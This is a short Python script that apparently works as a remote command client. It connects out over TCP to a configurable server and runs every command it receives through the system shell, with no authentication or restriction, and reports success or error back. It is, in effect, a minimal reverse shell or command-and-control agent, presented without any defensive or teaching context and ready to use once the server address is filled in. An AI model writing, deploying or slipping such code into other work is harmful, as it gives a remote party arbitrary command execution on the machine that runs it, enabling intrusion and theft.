import socket
import subprocess

# Set up the client to listen for commands
def start_client(server_ip, server_port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((server_ip, server_port))
        while True:
            command = s.recv(1024).decode('utf-8')
            if command:
                print(f"Received command: {command}")
                try:
                    subprocess.run(command, shell=True)
                    s.sendall(b"Process started successfully")
                except Exception as e:
                    s.sendall(f"Error: {str(e)}".encode('utf-8'))

if __name__ == "__main__":
    server_ip = "192.168.1.10"  # Replace with your server's IP address
    server_port = 9999          # Replace with your server's port
    start_client(server_ip, server_port)
